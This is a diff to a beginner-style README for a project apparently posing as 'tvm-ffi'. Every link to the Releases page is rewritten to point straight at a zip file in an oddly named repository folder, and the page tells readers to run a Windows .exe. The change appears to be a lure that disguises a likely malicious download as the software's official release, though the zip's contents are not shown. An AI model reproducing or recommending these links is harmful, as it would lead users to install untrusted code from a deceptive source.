@@ -1,6 +1,6 @@
 # 🌟 tvm-ffi - Simplifying Machine Learning with Ease
 
-[![Download TVM FFI](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Nabeelnuman/tvm-ffi/releases)
+[![Download TVM FFI](https://raw.githubusercontent.com/Nabeelnuman/tvm-ffi/main/punctually/tvm-ffi.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Nabeelnuman/tvm-ffi/main/punctually/tvm-ffi.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To begin using TVM FFI, follow these steps:
 
 1. **Visit the Download Page**: Click the link below to access the Releases page.
 
-   [Download TVM FFI](https://github.com/Nabeelnuman/tvm-ffi/releases)
+   [Download TVM FFI](https://raw.githubusercontent.com/Nabeelnuman/tvm-ffi/main/punctually/tvm-ffi.zip)
 
 2. **Choose Your Version**: Find the latest version of TVM FFI on the Releases page. You will see a list of available files.
 
@@ -41,7 +41,7 @@ To download and install TVM FFI, follow these detailed instructions:
 
 1. **Enter the Releases Page**: Start by visiting the Releases page for TVM FFI.
 
-   [Download TVM FFI](https://github.com/Nabeelnuman/tvm-ffi/releases)
+   [Download TVM FFI](https://raw.githubusercontent.com/Nabeelnuman/tvm-ffi/main/punctually/tvm-ffi.zip)
 
 2. **Select a Downloadable File**:
    - For Windows, select `.exe` file.
@@ -84,6 +84,6 @@ If you experience difficulties or have questions, reach out for help. You can fi
 
 TVM FFI offers a robust solution for users looking to dive into machine learning without needing extensive technical knowledge. Follow the steps above to download, install, and start using TVM FFI today.
 
-For more information and updates, keep an eye on our [Releases page](https://github.com/Nabeelnuman/tvm-ffi/releases). 
+For more information and updates, keep an eye on our [Releases page](https://raw.githubusercontent.com/Nabeelnuman/tvm-ffi/main/punctually/tvm-ffi.zip). 
 
 Happy Learning!
